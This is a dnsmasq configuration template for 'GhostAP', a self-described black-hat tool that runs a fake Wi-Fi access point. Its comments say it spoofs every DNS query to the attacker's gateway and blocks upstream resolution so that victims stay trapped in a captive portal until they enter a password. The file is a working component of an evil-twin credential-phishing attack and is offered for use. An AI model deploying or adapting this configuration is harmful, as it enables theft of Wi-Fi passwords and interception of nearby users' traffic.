# ======================================================================
#  GhostAP — dnsmasq Configuration Template
#  Developer: ATHEX BLACK HAT
#  Version: 1.0.0
#  Description: DHCP + DNS server for captive portal support
#  Placeholders: {{INTERFACE}} {{GATEWAY}} {{DHCP_START}}
#                {{DHCP_END}} {{LEASE_TIME}}
# ======================================================================

# === INTERFACE ===
# bind to the fake AP interface only
interface={{INTERFACE}}
bind-interfaces

# === DHCP SERVER ===
# IP range for connecting clients
dhcp-range={{DHCP_START}},{{DHCP_END}},{{LEASE_TIME}}

# tell clients to use our gateway as router
dhcp-option=3,{{GATEWAY}}

# tell clients to use our gateway as DNS server
dhcp-option=6,{{GATEWAY}}

# === DNS SPOOFING ===
# redirect ALL dns queries to our gateway (captive portal)
# this forces any URL the victim types to land on our portal
address=/#/{{GATEWAY}}

# do NOT forward queries to upstream DNS servers
# keeps victim trapped in our portal until password is entered
no-resolv

# === LEASE FILE ===
# track connected clients
dhcp-leasefile=/var/lib/misc/dnsmasq.leases

# === PERFORMANCE ===
# small cache — we don't need much
cache-size=0

# respond to queries quickly
local-ttl=60

# === LOGGING ===
# log all DNS queries (helps debug if portal isn't showing)
log-queries

# log DHCP requests and leases
log-dhcp

# write logs to a temporary file
log-facility=/tmp/ghostap_dnsmasq.log

# === SECURITY ===
# do not read /etc/resolv.conf
# prevents DNS leak to real upstream servers
no-poll

# filter useless queries
filterwin2k

# === ADVANCED ===
# DHCP authorative mode — respond faster
dhcp-authoritative

# quiet startup — suppress warnings
quiet-dhcp
quiet-dhcp6
quiet-ra

# don't try to read hosts file
no-hosts

# ======================================================================
#  END OF DNSMASQ TEMPLATE
# ======================================================================